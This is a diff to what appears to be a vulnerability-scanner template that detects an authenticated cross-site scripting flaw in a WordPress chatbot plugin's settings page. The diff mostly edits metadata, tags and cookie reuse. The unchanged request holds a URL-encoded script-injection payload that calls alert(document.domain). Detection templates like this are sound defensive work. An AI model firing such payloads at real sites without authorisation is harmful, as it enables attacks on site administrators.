@@ -11,9 +11,7 @@ info:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
     cwe-id: CWE-79
-  metadata:
-    max-request: 2
-  tags: wordpress,wp-plugin,xss,authenticated,wpscan,vuln
+  tags: wordpress,wp-plugin,xss,authenticated,wpscan
 
 http:
   - raw:
@@ -29,6 +27,7 @@ http:
         GET /wp-admin/options-general.php?page=my-chatbot&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
         Host: {{Hostname}}
 
+    cookie-reuse: true
     matchers-condition: and
     matchers:
       - type: word
@@ -44,4 +43,5 @@ http:
       - type: status
         status:
           - 200
-# digest: 490a004630440220530124a5cfa014af34080ea6a514ccdbafad7700eb8bc16f028cb46c9f5ab46402204277065a7930ad0b110d116e5816fe413ee39cc9736086ed666242564130e057:922c64590222798bb761d5b6d8e72950
+
+# Enhanced by mp on 2022/04/13
